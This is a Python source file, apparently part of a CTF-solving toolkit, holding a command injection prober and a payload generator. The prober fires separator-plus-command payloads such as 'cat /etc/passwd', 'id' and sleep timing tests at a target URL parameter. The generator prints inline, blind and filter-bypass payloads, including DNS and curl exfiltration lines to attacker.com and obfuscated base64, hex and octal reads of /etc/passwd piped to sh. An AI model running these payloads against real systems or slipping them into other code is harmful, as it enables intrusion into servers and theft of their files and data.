"""
Command Injection detection and exploitation tools for CTF solving.

Provides utilities for detecting OS command injection vulnerabilities
and generating bypass payloads for filtered environments.
"""

import re
import time
from typing import List, Optional, Tuple

import requests

from ctf_solver.tools.core import parse_json_input


class CommandInjectionProbeTool:
    """
    CommandInjectionProbeTool: detect OS command injection vulnerabilities.

    Tool interface (FAIR-style):
      - `name` and `description` class attributes.
      - `.use(tool_input: str) -> str`, where tool_input is JSON.

    Expected JSON tool_input format:

        {
          "url": "http://target.com/ping",
          "param": "ip",
          "method": "GET",                  # optional, default GET
          "data": {"other": "value"},       # optional extra form data
          "os_target": "linux",             # optional: linux, windows, or both (default linux)
          "timeout": 10                     # optional timeout in seconds
        }

    The tool injects various OS command separators combined with detection
    commands and analyzes responses to confirm command injection.
    """

    name: str = "cmdi_probe"
    description: str = (
        "Detect OS command injection vulnerabilities. Input must be JSON with "
        "'url' (target URL) and 'param' (parameter to test). Optionally provide "
        "'method' (GET/POST, default GET), 'data' (extra form data), "
        "'os_target' (linux/windows/both, default linux), and 'timeout' (default 10). "
        "Tests output-based and time-based injection using various separators and "
        "detection commands."
    )
    parameters_schema = {
        "type": "object",
        "properties": {
            "url": {"type": "string"},
            "param": {"type": "string"},
            "method": {"type": "string", "enum": ["GET", "POST"], "default": "GET"},
            "data": {"type": "object"},
            "os_target": {
                "type": "string",
                "enum": ["linux", "windows", "both"],
                "default": "linux",
            },
            "timeout": {"type": "integer", "default": 10},
        },
        "required": ["url", "param"],
        "additionalProperties": False,
    }
    samples = [{"url": "http://example.com/ping", "param": "host"}]

    # Linux separators paired with detection commands
    LINUX_SEPARATORS: List[str] = [
        ";",
        "|",
        "||",
        "&&",
        "`",
        "$(",
        "%0a",
        "\n",
    ]

    # Windows separators
    WINDOWS_SEPARATORS: List[str] = [
        "&",
        "|",
        "||",
    ]

    # Detection commands and their expected output patterns (Linux)
    LINUX_DETECTION_COMMANDS: List[Tuple[str, str]] = [
        ("id", r"uid="),
        ("whoami", None),  # Compare with baseline; any diff is a sign
        ("cat /etc/passwd", r"root:x:0:0:"),
    ]

    # Detection commands and their expected output patterns (Windows)
    WINDOWS_DETECTION_COMMANDS: List[Tuple[str, str]] = [
        ("dir", r"(<DIR>|Volume Serial Number)"),
    ]

    # Time-based payloads (Linux)
    LINUX_TIME_PAYLOADS: List[str] = [
        "; sleep 5",
        "| sleep 5",
        "$(sleep 5)",
        "`sleep 5`",
    ]

    # Time-based payloads (Windows)
    WINDOWS_TIME_PAYLOADS: List[str] = [
        "& timeout /t 5",
        "| ping -n 5 127.0.0.1",
    ]

    # Flag patterns for CTF detection
    FLAG_PATTERNS: List[str] = [
        r"(picoCTF\{[^}]+\})",
        r"(picoctf\{[^}]+\})",
        r"(HTB\{[^}]+\})",
        r"(htb\{[^}]+\})",
        r"(THM\{[^}]+\})",
        r"(thm\{[^}]+\})",
        r"(FLAG\{[^}]+\})",
        r"(flag\{[^}]+\})",
        r"(CTF\{[^}]+\})",
        r"(ctf\{[^}]+\})",
    ]

    def __init__(self, session: Optional[requests.Session] = None):
        self.session = session or requests.Session()

    def _extract_flag(self, text: str) -> Optional[str]:
        """Try to extract a CTF flag from response text."""
        for pattern in self.FLAG_PATTERNS:
            match = re.search(pattern, text)
            if match:
                return match.group(1)
        return None

    def _build_output_payloads(
        self, os_target: str
    ) -> List[Tuple[str, str, Optional[str]]]:
        """Build output-based payloads: (payload_string, description, expected_pattern)."""
        payloads = []

        if os_target in ("linux", "both"):
            for sep in self.LINUX_SEPARATORS:
                for cmd, pattern in self.LINUX_DETECTION_COMMANDS:
                    if sep == "$(":
                        payload = f"$({cmd})"
                    elif sep == "`":
                        payload = f"`{cmd}`"
                    else:
                        payload = f"{sep}{cmd}"
                    desc = f"Linux: separator='{sep}' cmd='{cmd}'"
                    payloads.append((payload, desc, pattern))

        if os_target in ("windows", "both"):
            for sep in self.WINDOWS_SEPARATORS:
                for cmd, pattern in self.WINDOWS_DETECTION_COMMANDS:
                    payload = f"{sep}{cmd}"
                    desc = f"Windows: separator='{sep}' cmd='{cmd}'"
                    payloads.append((payload, desc, pattern))

        return payloads

    def _build_time_payloads(self, os_target: str) -> List[Tuple[str, str]]:
        """Build time-based payloads: (payload_string, description)."""
        payloads = []

        if os_target in ("linux", "both"):
            for p in self.LINUX_TIME_PAYLOADS:
                payloads.append((p, f"Linux time-based: {p}"))

        if os_target in ("windows", "both"):
            for p in self.WINDOWS_TIME_PAYLOADS:
                payloads.append((p, f"Windows time-based: {p}"))

        return payloads

    def _make_request(
        self,
        url: str,
        method: str,
        param: str,
        payload: str,
        extra_data: dict,
        timeout: int,
        headers: dict = None,
    ) -> requests.Response:
        """Make request with payload injected into parameter."""
        request_data = {param: payload, **extra_data}
        headers = headers or {}
        if method == "GET":
            return self.session.get(
                url, params=request_data, headers=headers, timeout=timeout
            )
        else:
            # Detect JSON content type
            content_type = ""
            for k, v in headers.items():
                if k.lower() == "content-type":
                    content_type = v.lower()
                    break
            if "application/json" in content_type:
                return self.session.post(
                    url, json=request_data, headers=headers, timeout=timeout
                )
            else:
                return self.session.post(
                    url, data=request_data, headers=headers, timeout=timeout
                )

    def use(self, tool_input: str) -> str:
        # Parse JSON input
        data, err = parse_json_input(tool_input, "CommandInjectionProbeTool")
        if err:
            return err
        url = data.get("url", "").strip() if isinstance(data.get("url"), str) else ""
        param = (
            data.get("param", "").strip() if isinstance(data.get("param"), str) else ""
        )
        method = data.get("method", "GET").upper()
        extra_data = data.get("data", {})
        headers = data.get("headers", {})
        os_target = data.get("os_target", "linux").lower()
        timeout = data.get("timeout", 10)

        if not url:
            return "[CommandInjectionProbeTool] Error: 'url' is required."
        if not param:
            return "[CommandInjectionProbeTool] Error: 'param' is required."
        if method not in ("GET", "POST"):
            return f"[CommandInjectionProbeTool] Error: 'method' must be GET or POST, got '{method}'."
        if os_target not in ("linux", "windows", "both"):
            return f"[CommandInjectionProbeTool] Error: 'os_target' must be linux, windows, or both, got '{os_target}'."

        try:
            return self._probe_cmdi(
                url, method, param, extra_data, headers, os_target, timeout
            )
        except requests.RequestException as e:
            return f"[CommandInjectionProbeTool] Request error: {e}"
        except Exception as e:
            return f"[CommandInjectionProbeTool] Error: {e}"

    def _probe_cmdi(
        self,
        url: str,
        method: str,
        param: str,
        extra_data: dict,
        headers: dict,
        os_target: str,
        timeout: int,
    ) -> str:
        """Probe for command injection vulnerabilities."""
        results = []
        confirmed_injections = []
        successful_separators = []
        detected_os = None
        time_based_results = []
        flags_found = []

        results.append("[CommandInjectionProbeTool] Command Injection Detection Scan")
        results.append("=" * 60)
        results.append(f"URL: {url}")
        results.append(f"Method: {method}")
        results.append(f"Parameter: {param}")
        results.append(f"OS Target: {os_target}")
        results.append("")

        # Get baseline response
        try:
            baseline_start = time.time()
            baseline = self._make_request(
                url, method, param, "BASELINE_TEST_VALUE", extra_data, timeout, headers
            )
            baseline_time = time.time() - baseline_start
            baseline_text = baseline.text
            baseline_len = len(baseline_text)
            results.append(
                f"Baseline: status={baseline.status_code}, length={baseline_len}, time={baseline_time:.2f}s"
            )
        except Exception as e:
            return f"[CommandInjectionProbeTool] Error: Could not get baseline response: {e}"

        results.append("")

        # === Output-based probing ===
        results.append("=== Output-Based Probes ===")
        output_payloads = self._build_output_payloads(os_target)

        for payload, desc, expected_pattern in output_payloads:
            try:
                resp = self._make_request(
                    url, method, param, payload, extra_data, timeout, headers
                )
                resp_text = resp.text

                matched = False
                if expected_pattern and re.search(expected_pattern, resp_text):
                    matched = True
                elif expected_pattern is None and resp_text != baseline_text:
                    # For commands like whoami with no fixed pattern,
                    # check if the response differs from baseline
                    if len(resp_text) != baseline_len:
                        matched = True

                # Check for flag in response
                flag = self._extract_flag(resp_text)
                if flag:
                    flags_found.append(flag)
                    results.append(f"[!] FLAG FOUND: {flag}")

                # Check for /etc/passwd content
                if "root:x:0:0:" in resp_text:
                    matched = True

                if matched:
                    confirmed_injections.append(desc)
                    separator = payload.split(")")[0] if "$(" in payload else payload[0]
                    if separator not in successful_separators:
                        successful_separators.append(separator)

                    # Detect OS from output
                    if re.search(r"uid=", resp_text):
                        detected_os = "Linux"
                    elif re.search(r"(<DIR>|Volume Serial Number)", resp_text):
                        detected_os = "Windows"

                    results.append(f"[+] INJECTION CONFIRMED: {desc}")
                    results.append(f"    Payload: {payload}")
                else:
                    results.append(f"[-] No injection: {desc}")

            except Exception as e:
                results.append(f"[!] Error testing {desc}: {e}")

        results.append("")

        # === Time-based probing ===
        results.append("=== Time-Based Probes ===")
        time_payloads = self._build_time_payloads(os_target)

        for payload, desc in time_payloads:
            try:
                start = time.time()
                self._make_request(
                    url, method, param, payload, extra_data, timeout, headers
                )
                elapsed = time.time() - start
                time_diff = elapsed - baseline_time

                if time_diff > 4.0:
                    time_based_results.append(
                        {
                            "payload": payload,
                            "desc": desc,
                            "elapsed": elapsed,
                            "diff": time_diff,
                        }
                    )
                    results.append(f"[+] TIME-BASED INJECTION: {desc}")
                    results.append(
                        f"    Elapsed: {elapsed:.2f}s (baseline: {baseline_time:.2f}s, diff: {time_diff:.2f}s)"
                    )
                else:
                    results.append(f"[-] No delay: {desc} ({elapsed:.2f}s)")

            except Exception as e:
                results.append(f"[!] Error testing {desc}: {e}")

        results.append("")

        # === Summary ===
        results.append("=== Summary ===")
        if confirmed_injections or time_based_results:
            results.append("[!] COMMAND INJECTION DETECTED!")
            if confirmed_injections:
                results.append(
                    f"[*] Output-based confirmed: {len(confirmed_injections)} injection(s)"
                )
                for inj in confirmed_injections:
                    results.append(f"    - {inj}")
            if time_based_results:
                results.append(
                    f"[*] Time-based confirmed: {len(time_based_results)} injection(s)"
                )
                for tb in time_based_results:
                    results.append(f"    - {tb['desc']} (delay: {tb['diff']:.2f}s)")
            if successful_separators:
                results.append(
                    f"[*] Successful separators: {', '.join(repr(s) for s in successful_separators)}"
                )
            if detected_os:
                results.append(f"[*] Detected OS: {detected_os}")
        else:
            results.append("[-] No command injection detected")
            results.append("[*] Consider trying different parameters or input encoding")

        if flags_found:
            results.append("")
            results.append("!!! FLAGS FOUND !!!")
            for flag in flags_found:
                results.append(f"  {flag}")

        return "\n".join(results)


class CommandInjectionPayloadGenerator:
    """
    CommandInjectionPayloadGenerator: generate OS command injection payloads.

    Tool interface (FAIR-style):
      - `name` and `description` class attributes.
      - `.use(tool_input: str) -> str`, where tool_input is JSON.

    Expected JSON tool_input format:

        {
          "operation": "inline",            # inline, blind, or filter_bypass
          "command": "id",                  # optional, default "id"
          "os_target": "linux"              # optional: linux, windows, or both (default linux)
        }

    Operations:
      - inline: Standard injection payloads with all separator types
      - blind: Time-based and out-of-band payloads
      - filter_bypass: Bypass techniques for restricted environments
    """

    name: str = "cmdi_payload_generator"
    description: str = (
        "Generate OS command injection payloads for various scenarios. Input must be JSON "
        "with 'operation' (inline, blind, or filter_bypass). Optionally provide 'command' "
        "(default 'id') and 'os_target' (linux/windows/both, default linux). "
        "Returns categorized payloads with explanations."
    )

    VALID_OPERATIONS = ("inline", "blind", "filter_bypass")

    def __init__(self):
        pass

    def use(self, tool_input: str) -> str:
        # Parse JSON input
        data, err = parse_json_input(tool_input, "CommandInjectionPayloadGenerator")
        if err:
            return err
        operation = data.get("operation", "").strip().lower()
        command = data.get("command", "id")
        os_target = data.get("os_target", "linux").lower()

        if not operation:
            return "[CommandInjectionPayloadGenerator] Error: 'operation' is required. Must be one of: inline, blind, filter_bypass."

        if operation not in self.VALID_OPERATIONS:
            return (
                f"[CommandInjectionPayloadGenerator] Error: Invalid operation '{operation}'. "
                f"Must be one of: inline, blind, filter_bypass."
            )

        if operation == "inline":
            return self._generate_inline(command, os_target)
        elif operation == "blind":
            return self._generate_blind(command, os_target)
        elif operation == "filter_bypass":
            return self._generate_filter_bypass(command, os_target)

        return "[CommandInjectionPayloadGenerator] Error: Unexpected state."

    def _generate_inline(self, command: str, os_target: str) -> str:
        """Generate inline (output-based) command injection payloads."""
        lines = []
        lines.append("[CommandInjectionPayloadGenerator] Inline Payloads")
        lines.append("=" * 60)
        lines.append(f"Command: {command}")
        lines.append(f"OS Target: {os_target}")
        lines.append("")

        if os_target in ("linux", "both"):
            lines.append("=== Linux Payloads ===")
            lines.append("")

            lines.append("--- Semicolon separator (new command) ---")
            lines.append(f"; {command}")
            lines.append(f";{command}")
            lines.append("")

            lines.append("--- Pipe separator (pipe stdout) ---")
            lines.append(f"| {command}")
            lines.append(f"|{command}")
            lines.append("")

            lines.append("--- Double-pipe (OR logic, runs if first fails) ---")
            lines.append(f"|| {command}")
            lines.append(f"||{command}")
            lines.append("")

            lines.append("--- Double-ampersand (AND logic, runs if first succeeds) ---")
            lines.append(f"&& {command}")
            lines.append(f"&&{command}")
            lines.append("")

            lines.append("--- Backtick substitution ---")
            lines.append(f"`{command}`")
            lines.append("")

            lines.append("--- Dollar-paren substitution ---")
            lines.append(f"$({command})")
            lines.append("")

            lines.append("--- Newline separator ---")
            lines.append(f"%0a{command}")
            lines.append(f"\\n{command}")
            lines.append("")

        if os_target in ("windows", "both"):
            lines.append("=== Windows Payloads ===")
            lines.append("")

            lines.append("--- Ampersand separator (unconditional) ---")
            lines.append(f"& {command}")
            lines.append(f"&{command}")
            lines.append("")

            lines.append("--- Pipe separator ---")
            lines.append(f"| {command}")
            lines.append(f"|{command}")
            lines.append("")

            lines.append("--- Double-pipe (OR logic) ---")
            lines.append(f"|| {command}")
            lines.append(f"||{command}")
            lines.append("")

        return "\n".join(lines)

    def _generate_blind(self, command: str, os_target: str) -> str:
        """Generate blind (time-based and out-of-band) payloads."""
        lines = []
        lines.append("[CommandInjectionPayloadGenerator] Blind Payloads")
        lines.append("=" * 60)
        lines.append(f"Command: {command}")
        lines.append(f"OS Target: {os_target}")
        lines.append("")

        if os_target in ("linux", "both"):
            lines.append("=== Linux Sleep-Based ===")
            lines.append("; sleep 5")
            lines.append("| sleep 5")
            lines.append("$(sleep 5)")
            lines.append("`sleep 5`")
            lines.append("&& sleep 5")
            lines.append("%0asleep 5")
            lines.append("")

            lines.append("=== Linux Ping-Based ===")
            lines.append("; ping -c 5 127.0.0.1")
            lines.append("| ping -c 5 127.0.0.1")
            lines.append("$(ping -c 5 127.0.0.1)")
            lines.append("")

            lines.append("=== DNS Exfiltration ===")
            lines.append(f"; nslookup `{command}`.attacker.com")
            lines.append(f"; nslookup $({command}).attacker.com")
            lines.append(f"; dig `{command}`.attacker.com")
            lines.append(f"; curl http://attacker.com/$({command})")
            lines.append("")

        if os_target in ("windows", "both"):
            lines.append("=== Windows Time-Based ===")
            lines.append("& timeout /t 5")
            lines.append("| ping -n 5 127.0.0.1")
            lines.append("& ping -n 5 127.0.0.1")
            lines.append("")

            lines.append("=== Windows DNS Exfiltration ===")
            lines.append("& nslookup %USERNAME%.attacker.com")
            lines.append("")

        return "\n".join(lines)

    def _generate_filter_bypass(self, command: str, os_target: str) -> str:
        """Generate filter bypass payloads for restricted environments."""
        lines = []
        lines.append("[CommandInjectionPayloadGenerator] Filter Bypass Payloads")
        lines.append("=" * 60)
        lines.append(f"Command: {command}")
        lines.append(f"OS Target: {os_target}")
        lines.append("")

        lines.append("=== Space Bypass Techniques ===")
        lines.append(f"${{IFS}}{command}")
        lines.append(f"$IFS$9{command}")
        lines.append("{cat,/etc/passwd}")
        lines.append("cat</etc/passwd")
        lines.append("X=$'cat\\x20/etc/passwd'&&$X")
        lines.append(f"{command.replace(' ', '${IFS}')}")
        lines.append("")

        lines.append("=== Keyword Bypass Techniques ===")
        if len(command) >= 3:
            mid = len(command) // 2
            part1 = command[:mid]
            part2 = command[mid:]
            lines.append(f"# Single-quote insertion: {part1}'{part2}")
            lines.append(f"{part1}'{part2}")
            lines.append(f'# Double-quote insertion: {part1}"{part2}')
            lines.append(f'{part1}"{part2}')
            lines.append(f"# Backslash insertion: {part1}\\{part2}")
            lines.append(f"{part1}\\{part2}")
        lines.append("# Wildcard match (e.g., cat -> /bin/c?t)")
        lines.append("/bin/c?t /etc/passwd")
        lines.append("/bin/ca* /etc/passwd")
        lines.append("# Variable expansion: c${not_exist}at")
        lines.append("c${not_exist}at /etc/passwd")
        lines.append("")

        lines.append("=== Encoding Bypass Techniques ===")
        lines.append("# Hex encoding with printf")
        hex_cmd = "".join(f"\\x{ord(c):02x}" for c in command)
        lines.append(f"$(printf '{hex_cmd}')")
        lines.append("# Base64 encoding")
        # We generate the template, not the actual base64
        lines.append(f"echo {command}|base64 => use result in: echo <b64>|base64 -d|sh")
        lines.append("echo Y2F0IC9ldGMvcGFzc3dk|base64 -d|sh")
        lines.append("# Octal encoding")
        lines.append("$'\\143\\141\\164' /etc/passwd")
        lines.append("")

        return "\n".join(lines)
